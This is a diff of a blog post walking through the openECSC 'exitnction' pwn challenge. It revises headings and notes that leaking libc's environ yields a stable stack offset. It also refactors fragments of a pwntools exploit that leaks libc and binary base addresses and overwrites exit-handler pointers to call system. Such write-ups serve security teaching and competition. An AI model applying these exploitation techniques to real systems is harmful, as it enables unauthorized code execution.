@@ -2,7 +2,7 @@
 title: exitnction - openECSC - Walkthrough
 date: 2025-10-05 10:00:00 +0200
 categories: [openECSC,pwn]
-tags: [pwn,exit,pwntools]
+tags: [pwn,exit,pwntools,openECSC]
 description: Exploit exit to get system.
 image:
   path: /assets/blog/exitnction/Logo.png
@@ -10,7 +10,7 @@ image:
 ---
 
 
-## Description
+## Introduction
 
 This is one of the **pwn** challenges of the openECSC (Open European Cybersecurity Challenge) competition. The challenge was made by `mantix101`. It starts with the following description and a file containing the challenge (`exitnction.tar.gz`). The challenge was rated as medium and 37 people solved it.
 
@@ -41,8 +41,6 @@ This is one of the **pwn** challenges of the openECSC (Open European Cybersecuri
 > 
 > Security Team - Exitnction **Limited**
 
-
-## Introduction
 
 The challenge file (`exitnction.tar.gz`) contains these files:
 ```terminal
@@ -352,7 +350,9 @@ At this point, we have achieved the following primitives and achievements:
 **Initial**
 Although we can write anywhere in memory, we still face the challenge of achieving code execution. We can't simply pivot to a ROP chain on the stack because we don't have a stack address.
 
-My initial approach was to leak a stack address from `libc`, since `libc` typically contains stack pointers. While I successfully found a stack address in `libc`, it proved too unstable across runs to be reliable for exploitation.
+My initial approach was to leak a stack address from `libc`, since `libc` typically contains stack pointers. ~~While I successfully found a stack address in `libc`, it proved too unstable across runs to be reliable for exploitation.~~
+
+There is a way of exploiting this by leaking `libc`'s `environ` variable. With this address you will get a stable offset on the stack to overwrite a return pointer.
 
 **Exit Strategy**
 
@@ -572,7 +572,7 @@ context.arch = 'amd64'
 ld = ELF("./ld-2.39.so")
 
 p = process([elf.path])
-# p = remote("b682bc52-e0da-469c-82f6-bf1fa47eda6f.openec.sc",31337,ssl=True)
+# p = remote("bb5489ea-a655-4205-89ad-8a47f1363e5e.openec.sc",31337,ssl=True)
 
 libc = elf.libc
 
@@ -619,19 +619,22 @@ def leak_addresses_and_setup(proc):
     libc.address = addrs['backend'] - libc.symbols['exit']
     log.info(f"Leaked libc base: {hex(libc.address)}")
 
+    license_addr = addrs['license']
+    elf.address = license_addr - 16560
+    log.info(f"Leaked elf base address: {hex(elf.address)}")
+
     proc.sendline(b"help")
     time.sleep(0.5)
     log.info(f"Leaked the addresses of libc and the binary")
     return addrs
 
-def set_elf_and_debug(addrs):
+def debug_addr(addrs):
     license_addr = addrs['license']
     debug_addr = license_addr - 8151
-    elf.address = license_addr - 16560
-    log.info(f"Leaked elf base address: {hex(elf.address)}")
-    return license_addr, debug_addr
+    return debug_addr
 
-def leak_debug_address(proc, addrs, license_addr, debug_addr):
+def leak_debug_address(proc, addrs, debug_addr):
+    license_addr = addrs["license"]
     payload_debug = p64(debug_addr)
     
     write_email(proc, license_addr, payload_debug)
@@ -685,12 +688,13 @@ def encrypt_system_and_write(initial_addr, key):
 
 def main():
     addrs = leak_addresses_and_setup(p)
-    license_addr, debug_addr = set_elf_and_debug(addrs)
+    debug_addr_val = debug_addr(addrs)
 
-    leak_debug_address(p, addrs, license_addr, debug_addr)
+    leak_debug_address(p, addrs, debug_addr_val)
+    
     
     initial_addr = write_bin_sh_into_struct()
-    key = overwrite_initial_pointer_and_extract_key(initial_addr, license_addr)
+    key = overwrite_initial_pointer_and_extract_key(initial_addr, addrs["license"])
     
     encrypt_system_and_write(initial_addr, key)
     
@@ -701,7 +705,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 ```
 
 ## Conclusion
